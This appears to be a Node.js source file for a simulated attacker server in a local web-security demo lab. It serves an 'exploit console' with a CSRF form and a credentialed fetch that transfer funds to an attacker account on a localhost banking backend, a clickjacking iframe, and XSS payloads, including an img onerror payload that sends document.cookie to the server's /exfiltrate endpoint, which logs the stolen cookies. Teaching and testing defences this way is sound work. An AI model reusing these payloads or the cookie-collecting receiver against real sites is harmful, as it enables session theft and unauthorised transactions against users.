/**
 * Simulated Attacker Origin Server (Port 6660).
 * Demonstrates real-world Cross-Origin Exploits:
 * - CSRF Form Submissions (Ambient Cookie Abuse)
 * - Cross-Origin Fetch Attacks
 * - Clickjacking Framing Attempts
 * - XSS Exfiltration Payload Receiver
 */
import http from 'node:http';
import url from 'node:url';

const PORT = 6660;
const exfiltratedData = [];

const ATTACKER_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Attacker Command Center (Origin: http://localhost:6660)</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace;
      background: #0f172a;
      color: #f8fafc;
      margin: 0;
      padding: 24px;
    }
    h1 { color: #ef4444; margin-top: 0; }
    h2 { color: #f59e0b; border-bottom: 1px solid #334155; padding-bottom: 6px; }
    .card {
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 8px;
      padding: 16px;
      margin-bottom: 20px;
    }
    button {
      background: #dc2626;
      color: white;
      border: none;
      padding: 10px 18px;
      font-size: 14px;
      font-weight: 600;
      border-radius: 6px;
      cursor: pointer;
      margin-right: 8px;
      margin-top: 8px;
    }
    button:hover { background: #b91c1c; }
    button.secondary { background: #475569; }
    button.secondary:hover { background: #334155; }
    pre {
      background: #020617;
      padding: 12px;
      border-radius: 6px;
      overflow-x: auto;
      border: 1px solid #1e293b;
      font-size: 13px;
      color: #38bdf8;
    }
    .badge {
      display: inline-block;
      padding: 2px 8px;
      border-radius: 4px;
      font-size: 12px;
      font-weight: bold;
      background: #ef4444;
      color: white;
    }
    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
    iframe { width: 100%; height: 200px; border: 2px dashed #ef4444; background: white; }
    input[type="text"] {
      background: #0f172a;
      border: 1px solid #475569;
      color: white;
      padding: 8px 12px;
      border-radius: 4px;
      width: 70%;
    }
  </style>
</head>
<body>
  <h1>Attacker Portal & Exploit Console</h1>
  <p><strong>Attacking Origin:</strong> <code>http://localhost:6660</code> &rarr; <strong>Target Backend:</strong> <code>http://localhost:8115</code></p>

  <div class="grid">
    <div>
      <div class="card">
        <h2>1. CSRF Exploit: Cross-Origin Transfer</h2>
        <p>Attempts to silently siphon <strong>$5,000.00</strong> to <code>Attacker_Offshore_Account</code> using ambient browser session cookies.</p>
        
        <!-- Standard HTML Form Cross-Origin POST (No Preflight required!) -->
        <form id="csrfForm" action="http://localhost:8115/api/transfer" method="POST" target="csrf_target">
          <input type="hidden" name="recipient" value="Attacker_Offshore_Account" />
          <input type="hidden" name="amount" value="5000" />
          <button type="submit">Execute Cross-Origin Form CSRF</button>
        </form>

        <button class="secondary" onclick="executeFetchCSRF()">Execute Cross-Origin Fetch CSRF (credentials: include)</button>
        
        <p style="margin-top: 10px; font-size: 13px; color: #94a3b8;">Form submission result target:</p>
        <iframe name="csrf_target" id="csrf_target"></iframe>
        <div id="fetchResult" style="margin-top: 10px; font-size: 13px;"></div>
      </div>

      <div class="card">
        <h2>2. Clickjacking / Framing Attack</h2>
        <p>Attempts to embed the Treasury application inside a transparent iframe for UI redressing.</p>
        <iframe src="http://localhost:8115/" title="Clickjacking Preview"></iframe>
      </div>
    </div>

    <div>
      <div class="card">
        <h2>3. XSS Payloads for Victim SPA</h2>
        <p>Copy and submit these into the Victim Audit Comment Feed (<code>http://localhost:5173</code>):</p>
        
        <div>
          <label><strong>Payload A: Malicious <code>javascript:</code> Pseudo-Protocol (Link Sink)</strong></label>
          <pre>javascript:alert('XSS Exploit! Stolen Document Cookie: ' + document.cookie)</pre>
        </div>

        <div style="margin-top: 12px;">
          <label><strong>Payload B: Image Tag Exfiltration (Rich-Text Sink)</strong></label>
          <pre>&lt;img src="x" onerror="fetch('http://localhost:6660/exfiltrate?data='+encodeURIComponent(document.cookie))"&gt;</pre>
        </div>

        <div style="margin-top: 12px;">
          <label><strong>Payload C: SVG Script Execution</strong></label>
          <pre>&lt;svg onload="alert('XSS Executed via SVG tag!')"&gt;</pre>
        </div>
      </div>

      <div class="card">
        <h2>4. Exfiltrated Data Log (Victim Tokens & Cookies)</h2>
        <p>Incoming data sent by successful XSS exploits:</p>
        <pre id="exfilLog">No data intercepted yet...</pre>
        <button class="secondary" onclick="refreshLog()">Refresh Log</button>
      </div>
    </div>
  </div>

  <script>
    async function executeFetchCSRF() {
      const resultDiv = document.getElementById('fetchResult');
      resultDiv.innerHTML = 'Sending cross-origin fetch with credentials...';
      try {
        const response = await fetch('http://localhost:8115/api/transfer', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ recipient: 'Attacker_Vault_99', amount: 3300 }),
          credentials: 'include' // Attaches ambient session_id cookie!
        });
        const data = await response.json();
        resultDiv.innerHTML = '<span style="color:#ef4444">Response Status: ' + response.status + '</span><br><pre>' + JSON.stringify(data, null, 2) + '</pre>';
      } catch (err) {
        resultDiv.innerHTML = '<span style="color:#22c55e">Request blocked by browser security boundary!</span><br><pre>' + err.message + '</pre>';
      }
    }

    async function refreshLog() {
      try {
        const res = await fetch('/api/exfiltrated');
        const data = await res.json();
        const logBox = document.getElementById('exfilLog');
        if (data.length === 0) {
          logBox.textContent = 'No data intercepted yet...';
        } else {
          logBox.textContent = JSON.stringify(data, null, 2);
        }
      } catch (e) {
        console.error(e);
      }
    }
    setInterval(refreshLog, 3000);
  </script>
</body>
</html>
`;

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);

  // CORS headers allowing browser to fetch log
  res.setHeader('Access-Control-Allow-Origin', '*');

  if (parsed.pathname === '/' || parsed.pathname === '/index.html') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(ATTACKER_HTML);
    return;
  }

  if (parsed.pathname === '/exfiltrate') {
    const data = parsed.query.data || parsed.query.cookie || 'empty';
    const timestamp = new Date().toISOString();
    const entry = { timestamp, data, userAgent: req.headers['user-agent'] };
    exfiltratedData.unshift(entry);
    console.log(`\x1b[31m[EXFILTRATION INTERCEPTED]\x1b[0m ${JSON.stringify(entry)}`);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'exfiltrated', recorded: entry }));
    return;
  }

  if (parsed.pathname === '/api/exfiltrated') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(exfiltratedData));
    return;
  }

  res.writeHead(404, { 'Content-Type': 'text/plain' });
  res.end('Not Found');
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\x1b[32m[Attacker Origin Server]\x1b[0m Listening on http://localhost:${PORT}`);
  console.log(`  - Target Backend: http://localhost:8115`);
  console.log(`  - Exfiltration Sink: http://localhost:${PORT}/exfiltrate`);
});
